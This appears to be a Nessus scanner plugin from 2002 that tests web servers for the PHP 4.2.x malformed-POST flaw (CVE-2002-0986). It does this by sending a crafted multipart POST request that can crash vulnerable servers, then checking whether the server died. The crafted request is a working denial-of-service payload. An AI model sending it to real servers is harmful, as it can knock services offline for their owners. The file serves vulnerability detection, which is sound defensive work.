#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#
# Incidentally covers CVE-2002-0985 and 986
#

if(description)
{
 script_id(11050);
 script_bugtraq_id(5278);

 script_version("$Revision: 1.21 $");
 script_cve_id("CVE-2002-0986");
 if ( defined_func("script_xref") ) script_xref(name:"SuSE", value:"SUSE-SA:2002:036");

 
 name["english"] = "php 4.2.x malformed POST ";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a version of PHP earlier
than 4.2.2.

The new POST handling system in PHP 4.2.0 and 4.2.1 has
a bug which allows an attacker to disable the remote server
or to compromise it.

Solution : Upgrade to PHP 4.2.2 or downgrade to 4.1.2
Risk factor : High";




 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for version of PHP";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include("backport.inc");


port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner)exit(0);
php = get_php_version(banner:banner);
if ( ! php ) exit(0);

if(get_port_state(port))
{
 if ( ! can_host_php(port:port) ) exit(0);

  files = get_kb_list(string("www/", port, "/content/extensions/php*"));
  if(isnull(files))file = "/index.php";
  else file = files[0];
  
  if(is_cgi_installed_ka(item:file, port:port))
  {
   req = string("POST ", file, " HTTP/1.1\r\n",
        "Referer: ", get_host_name(), "\r\n",
        "Connection: Keep-Alive\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-type: multipart/form-data; boundary=nessus\r\n",
        "Content-length: 45\r\n\r\n",
        "--nessus\r\n",
        "Content-Disposition: foo=bar;\r\n",
        "\r\n\r\n");
    soc = http_open_socket(port);
    if(!soc)exit(0);
    
    send(socket:soc, data:req);
    r = http_recv(socket:soc);
    http_close_socket(soc);
    if(http_is_dead(port: port)) { security_hole(port); }
  }
}